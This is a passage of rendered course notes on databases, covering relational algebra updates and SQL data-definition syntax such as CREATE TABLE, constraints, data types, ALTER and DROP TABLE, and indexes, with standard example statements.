<p>In relational algebra, an insertion is expressed by: </p>
<div class="arithmatex">\[
                r \leftarrow  r  \cup  E 
\]</div>
<p>where r is a relation and E is a relational algebra expression. </p>
<p>The insertion of a single tuple is expressed by letting E be a constant relation containing one tuple. </p>
<h3 id="note-db-lec2-updating">Updating<a class="headerlink" href="#note-db-lec2-updating" title="Permanent link">&para;</a></h3>
<p>A mechanism to change a value in a tuple without charging all  values in the tuple. </p>
<p>Use the <em>generalized projection</em> operator to do this task </p>
<div class="arithmatex">\[
                r \leftarrow \Pi_{F1, F2,\ldots, Fn}(r) 
\]</div>
<p>where each <span class="arithmatex">\(F_i\)</span> is either the <span class="arithmatex">\(i\)</span>th attribute of <span class="arithmatex">\(r\)</span>, if the <span class="arithmatex">\(i\)</span>th attribute is not updated, or, if the attribute is to be updated <span class="arithmatex">\(F_i\)</span>  is an expression, involving only constants and the attributes of <span class="arithmatex">\(r\)</span>, which gives the new value for the attribute</p></section><section class="print-page" id="note-db-sql" heading-number="2.2.1.4"><h1 id="note-db-sql-sql">SQL<a class="headerlink" href="#note-db-sql-sql" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 10827 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 773 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 5 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 47 分钟</p>
</div>
<p>SQL includes several parts:</p>
<ul>
<li>DDL: Data Definition Language</li>
<li>DML: Data Manipulation Language</li>
<li>DQL: Data Query Language</li>
<li>DCL: Data Control Language</li>
</ul>
<h2 id="note-db-sql-data-definition-language">Data Definition Language<a class="headerlink" href="#note-db-sql-data-definition-language" title="Permanent link">&para;</a></h2>
<p>The main functions of DDL contain:</p>
<ul>
<li>Define the <em>schema</em> for each relation</li>
<li>Define the <em>domain</em> of values associated with each attribute</li>
<li>Define the <em>integrity constraints</em></li>
<li>Define the <em>physical storage structure</em> of each relation on disk</li>
<li>Define the <em>indices</em> to be maintained for each relations</li>
<li>Define the <em>view</em> on relations</li>
</ul>
<p>For example,if we want to define a table named <code>branch</code></p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-db-sql-__codelineno-0-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-db-sql-__codelineno-0-2"></a><span class="w">    </span><span class="n">branch_name</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-db-sql-__codelineno-0-3"></a><span class="w">    </span><span class="n">branch_city</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-db-sql-__codelineno-0-4"></a><span class="w">    </span><span class="n">assets</span><span class="w"> </span><span class="nb">NUMERIC</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-db-sql-__codelineno-0-5"></a><span class="p">);</span>
</span></code></pre></div>
<p>or</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-db-sql-__codelineno-1-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-db-sql-__codelineno-1-2"></a><span class="w">    </span><span class="n">branch_name</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-db-sql-__codelineno-1-3"></a><span class="w">    </span><span class="n">branch_city</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">30</span><span class="p">),</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-db-sql-__codelineno-1-4"></a><span class="w">    </span><span class="n">assets</span><span class="w"> </span><span class="nb">NUMERIC</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">),</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-db-sql-__codelineno-1-5"></a><span class="w">    </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="w"> </span><span class="p">(</span><span class="n">branch_name</span><span class="p">)</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-db-sql-__codelineno-1-6"></a><span class="p">);</span>
</span></code></pre></div>
<h3 id="note-db-sql-domain-types">Domain types<a class="headerlink" href="#note-db-sql-domain-types" title="Permanent link">&para;</a></h3>
<ul>
<li><code>CHAR(n)</code>: fixed length character string,with user-specified length</li>
<li><code>VARCHAR(n)</code>: variable length character string,with user-specified maximum length</li>
<li><code>INT</code> or <code>INTEGER</code>: integer number</li>
<li><code>SMALLINT</code>: small integer number</li>
<li><code>NUMERIC(p, d)</code>: fixed point number with user-specified precision and scale(总共为p位有效位,其中小数点后有d位)</li>
<li><code>FLOAT(n)</code>: floating point number with user-specified precision,if <code>n</code> is omitted,the precision is 24</li>
<li><code>REAL</code>: floating point number with user-specified precision,such as 3.14，<code>REAL</code> is equivalent to <code>FLOAT(24)</code></li>
<li><code>DOUBLE</code> or <code>DOUBLE PRECISION</code>: double precision floating point number</li>
<li><code>NULL</code>: no value</li>
<li><code>DATE</code>: date in the format YYYY-MM-DD,such as 2025-03-01</li>
<li><code>TIME</code>: time in the format HH:MM:SS,such as 12:00:00</li>
<li><code>TIMESTAMP</code>: date and time in the format YYYY-MM-DD HH:MM:SS,such as 2025-03-01 12:00:00</li>
</ul>
<p>SQL provides various functions for data manipulation and type conversion, though the implementation may vary across different database systems. Here are some examples:</p>
<ul>
<li>
<p>String functions:</p>
<ul>
<li><code>CHAR(n)</code>: Convert ASCII code n to character,in Oracle,it is <code>CHR(n)</code></li>
<li><code>SUBSTRING(str, start, length)</code>: Extract substring from position start with given length,in Oracle,it is <code>SUBSTR(str, start, length)</code></li>
<li><code>LEN(str)</code>: Get length of string,in Oracle,it is <code>LENGTH(str)</code></li>
<li><code>GETDATE()</code>: Get current date and time,in Oracle,it is <code>SYSDATE</code></li>
<li><code>DATALENGTH(str)</code>: Get number of bytes used to represent string</li>
<li><code>CONCAT(str1, str2)</code>: Concatenate two or more strings</li>
<li><code>UPPER(str)</code>: Convert string to uppercase</li>
<li><code>LOWER(str)</code>: Convert string to lowercase</li>
<li><code>LTRIM(str)</code>: Remove leading spaces</li>
<li><code>RTRIM(str)</code>: Remove trailing spaces</li>
</ul>
</li>
<li>
<p>Numeric functions:</p>
<ul>
<li><code>ABS(n)</code>: Absolute value</li>
<li><code>ROUND(n, d)</code>: Round number to d decimal places</li>
<li><code>CEILING(n)</code>: Round up to nearest integer</li>
<li><code>FLOOR(n)</code>: Round down to nearest integer</li>
<li><code>POWER(x, y)</code>: x raised to power y</li>
<li><code>SQRT(n)</code>: Square root</li>
</ul>
</li>
<li>
<p>Date functions:</p>
<ul>
<li><code>GETDATE()</code>: Current date and time</li>
<li><code>DATEADD(part, n, date)</code>: Add n units to date</li>
<li><code>DATEDIFF(part, date1, date2)</code>: Difference between dates</li>
<li><code>YEAR(date)</code>: Extract year</li>
<li><code>MONTH(date)</code>: Extract month</li>
<li><code>DAY(date)</code>: Extract day</li>
</ul>
</li>
</ul>
<h3 id="note-db-sql-create-table">Create Table<a class="headerlink" href="#note-db-sql-create-table" title="Permanent link">&para;</a></h3>
<p>An SQL relation is define using the <code>CREATE TABLE</code> statement.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-db-sql-__codelineno-2-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-db-sql-__codelineno-2-2"></a><span class="w">    </span><span class="n">A1</span><span class="w"> </span><span class="n">D1</span><span class="p">,</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-db-sql-__codelineno-2-3"></a><span class="w">    </span><span class="n">A2</span><span class="w"> </span><span class="n">D2</span><span class="p">,</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-db-sql-__codelineno-2-4"></a><span class="w">    </span><span class="p">...,</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-db-sql-__codelineno-2-5"></a><span class="w">    </span><span class="n">An</span><span class="w"> </span><span class="n">Dn</span><span class="p">,</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-db-sql-__codelineno-2-6"></a><span class="w">    </span><span class="p">(</span><span class="n">integrity</span><span class="w"> </span><span class="n">constraint1</span><span class="p">),</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#note-db-sql-__codelineno-2-7"></a><span class="w">    </span><span class="p">...,</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#note-db-sql-__codelineno-2-8"></a><span class="w">    </span><span class="p">(</span><span class="n">integrity</span><span class="w"> </span><span class="n">constraintk</span><span class="p">)</span>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#note-db-sql-__codelineno-2-9"></a><span class="p">);</span>
</span></code></pre></div>
<ul>
<li>r is the name of the relation</li>
<li>Each Ai is an attribute name in the schema of relation r</li>
<li>Di is the data type of values in the domain of attribute Ai</li>
<li>integrity constrainti is a constraint on the values of attribute Ai,即完整性约束条件，例如外键约束，主键约束，唯一约束，检查约束等</li>
</ul>
<h4 id="note-db-sql-integrity-constraints">Integrity Constraints<a class="headerlink" href="#note-db-sql-integrity-constraints" title="Permanent link">&para;</a></h4>
<ul>
<li>
<p><strong>Not NULL</strong>: The attribute cannot be NULL
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-db-sql-__codelineno-3-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">employees</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#note-db-sql-__codelineno-3-2"></a><span class="w">    </span><span class="n">employee_id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#note-db-sql-__codelineno-3-3"></a><span class="w">    </span><span class="n">first_name</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#note-db-sql-__codelineno-3-4"></a><span class="w">    </span><span class="n">last_name</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#note-db-sql-__codelineno-3-5"></a><span class="p">);</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Primary Key</strong>: The attribute is the primary key of the relation
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-db-sql-__codelineno-4-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">departments</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#note-db-sql-__codelineno-4-2"></a><span class="w">    </span><span class="n">department_id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#note-db-sql-__codelineno-4-3"></a><span class="w">    </span><span class="n">department_name</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#note-db-sql-__codelineno-4-4"></a><span class="p">);</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Check</strong>: The attribute must satisfy a specified condition
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-db-sql-__codelineno-5-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#note-db-sql-__codelineno-5-2"></a><span class="w">    </span><span class="n">product_id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#note-db-sql-__codelineno-5-3"></a><span class="w">    </span><span class="n">price</span><span class="w"> </span><span class="nb">DECIMAL</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="k">CHECK</span><span class="w"> </span><span class="p">(</span><span class="n">price</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#note-db-sql-__codelineno-5-4"></a><span class="p">);</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Unique</strong>: The attribute must be unique
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-db-sql-__codelineno-6-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#note-db-sql-__codelineno-6-2"></a><span class="w">    </span><span class="n">user_id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#note-db-sql-__codelineno-6-3"></a><span class="w">    </span><span class="n">email</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="w"> </span><span class="k">UNIQUE</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#note-db-sql-__codelineno-6-4"></a><span class="p">);</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Foreign Key</strong>: The attribute must be a foreign key of the relation
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-db-sql-__codelineno-7-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">orders</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-db-sql-__codelineno-7-2"></a><span class="w">    </span><span class="n">order_id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#note-db-sql-__codelineno-7-3"></a><span class="w">    </span><span class="n">customer_id</span><span class="w"> </span><span class="nb">INT</span><span class="p">,</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#note-db-sql-__codelineno-7-4"></a><span class="w">    </span><span class="k">FOREIGN</span><span class="w"> </span><span class="k">KEY</span><span class="w"> </span><span class="p">(</span><span class="n">customer_id</span><span class="p">)</span><span class="w"> </span><span class="k">REFERENCES</span><span class="w"> </span><span class="n">customers</span><span class="p">(</span><span class="n">customer_id</span><span class="p">)</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#note-db-sql-__codelineno-7-5"></a><span class="p">);</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Default</strong>: The attribute must have a default value
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-db-sql-__codelineno-8-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">settings</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#note-db-sql-__codelineno-8-2"></a><span class="w">    </span><span class="n">setting_id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#note-db-sql-__codelineno-8-3"></a><span class="w">    </span><span class="n">theme</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="s1">&#39;light&#39;</span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#note-db-sql-__codelineno-8-4"></a><span class="p">);</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Index</strong>: The attribute must be indexed
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#note-db-sql-__codelineno-9-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="n">idx_last_name</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">employees</span><span class="p">(</span><span class="n">last_name</span><span class="p">);</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>View</strong>: The attribute must be a view of the relation
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#note-db-sql-__codelineno-10-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">VIEW</span><span class="w"> </span><span class="n">employee_view</span><span class="w"> </span><span class="k">AS</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#note-db-sql-__codelineno-10-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">employee_id</span><span class="p">,</span><span class="w"> </span><span class="n">first_name</span><span class="p">,</span><span class="w"> </span><span class="n">last_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span><span class="p">;</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Trigger</strong>: The attribute must be a trigger of the relation
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#note-db-sql-__codelineno-11-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TRIGGER</span><span class="w"> </span><span class="n">update_stock</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#note-db-sql-__codelineno-11-2"></a><span class="k">AFTER</span><span class="w"> </span><span class="k">INSERT</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">sales</span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#note-db-sql-__codelineno-11-3"></a><span class="k">FOR</span><span class="w"> </span><span class="k">EACH</span><span class="w"> </span><span class="k">ROW</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#note-db-sql-__codelineno-11-4"></a><span class="k">BEGIN</span>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#note-db-sql-__codelineno-11-5"></a><span class="w">    </span><span class="k">UPDATE</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">stock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stock</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">NEW</span><span class="p">.</span><span class="n">quantity</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">product_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">NEW</span><span class="p">.</span><span class="n">product_id</span><span class="p">;</span>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#note-db-sql-__codelineno-11-6"></a><span class="k">END</span><span class="p">;</span>
</span></code></pre></div></p>
</li>
</ul>
<blockquote>
<p>Primary key declaration on an attribute automatically ensures not null in SQL_92 onwards, needs to be explicitly stated in SQL_89 </p>
</blockquote>
<p>Another way to use integrity constraints is </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#note-db-sql-__codelineno-12-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">employees</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#note-db-sql-__codelineno-12-2"></a><span class="w">    </span><span class="n">employee_id</span><span class="w"> </span><span class="nb">INT</span><span class="p">,</span>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#note-db-sql-__codelineno-12-3"></a><span class="w">    </span><span class="k">primary</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="p">(</span><span class="n">employee_id</span><span class="p">)</span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#note-db-sql-__codelineno-12-4"></a><span class="p">);</span>
</span></code></pre></div>
<h3 id="note-db-sql-drop-and-alter-table">DROP and ALTER Table<a class="headerlink" href="#note-db-sql-drop-and-alter-table" title="Permanent link">&para;</a></h3>
<div style="text-align: center;">
<strong style="font-size: 2em;color: red;">Be careful to use the DROP command!!!</strong>
</div>

<h4 id="note-db-sql-drop-table">Drop Table<a class="headerlink" href="#note-db-sql-drop-table" title="Permanent link">&para;</a></h4>
<p>the drop table statement is used to delete a table from the database.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#note-db-sql-__codelineno-13-1"></a><span class="k">DROP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">employees</span><span class="p">;</span>
</span></code></pre></div>
<h4 id="note-db-sql-alter-table">Alter Table<a class="headerlink" href="#note-db-sql-alter-table" title="Permanent link">&para;</a></h4>
<p>the alter table statement is used to modify the structure of a table.</p>
<p>the format is </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#note-db-sql-__codelineno-14-1"></a><span class="k">ALTER</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">ADD</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="n">data_type</span><span class="p">;</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#note-db-sql-__codelineno-14-2"></a><span class="c1">-- add a new column</span>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#note-db-sql-__codelineno-14-3"></a><span class="k">ALTER</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">ADD</span><span class="w"> </span><span class="p">(</span><span class="k">column_name</span><span class="w"> </span><span class="n">data_type</span><span class="p">,</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="n">data_type</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#note-db-sql-__codelineno-14-4"></a><span class="c1">-- add multiple columns</span>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#note-db-sql-__codelineno-14-5"></a><span class="k">ALTER</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">DROP</span><span class="w"> </span><span class="k">COLUMN</span><span class="w"> </span><span class="k">column_name</span><span class="p">;</span>
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#note-db-sql-__codelineno-14-6"></a><span class="c1">-- drop a column</span>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#note-db-sql-__codelineno-14-7"></a><span class="k">ALTER</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">MODIFY</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="n">data_type</span><span class="p">;</span>
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#note-db-sql-__codelineno-14-8"></a><span class="c1">-- modify the data type of a column</span>
</span></code></pre></div>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#note-db-sql-__codelineno-15-1"></a><span class="k">ALTER</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">employees</span><span class="w"> </span><span class="k">ADD</span><span class="w"> </span><span class="k">COLUMN</span><span class="w"> </span><span class="n">email</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
</span></code></pre></div>
<h4 id="note-db-sql-create-index">Create Index<a class="headerlink" href="#note-db-sql-create-index" title="Permanent link">&para;</a></h4>
<p>Index is a data structure that improves the performance of database queries by allowing the database to quickly locate the data without having to scan the entire table.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#note-db-sql-__codelineno-16-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="n">index_name</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="k">table_name</span><span class="p">(</span><span class="n">attribute_list</span><span class="p">);</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#note-db-sql-__codelineno-16-2"></a><span class="c1">-- unique index</span>
